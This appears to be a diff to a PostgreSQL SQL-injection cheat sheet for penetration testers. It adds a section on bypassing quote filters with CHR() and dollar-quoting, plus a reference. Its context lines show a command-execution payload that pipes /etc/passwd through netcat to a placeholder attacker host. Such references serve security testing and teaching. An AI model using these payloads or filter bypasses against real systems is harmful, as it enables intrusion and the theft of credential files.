@@ -23,6 +23,7 @@
 * [PostgreSQL Command execution](#postgresql-command-execution)
     * [CVE-2019–9193](#cve-20199193)
     * [Using libc.so.6](#using-libcso6)
+* [Bypass Filter](#bypass-filter)
 * [References](#references)
 
 ## PostgreSQL Comments
@@ -203,6 +204,25 @@ CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu
 SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 ```
 
+### Bypass Filter
+
+#### Quotes
+
+Using CHR
+
+```sql
+SELECT CHR(65)||CHR(66)||CHR(67);
+```
+
+Using Dollar-signs  ( >= version 8 PostgreSQL)
+
+```sql
+SELECT $$This is a string$$
+SELECT $TAG$This is another string$TAG$
+```
+
+
+
 ## References
 
 * [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
@@ -210,3 +230,4 @@ SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 * [SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)](https://hackerone.com/reports/181803)
 * [POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
 * [SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic](https://pulsesecurity.co.nz/articles/postgres-sqli)
+* [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
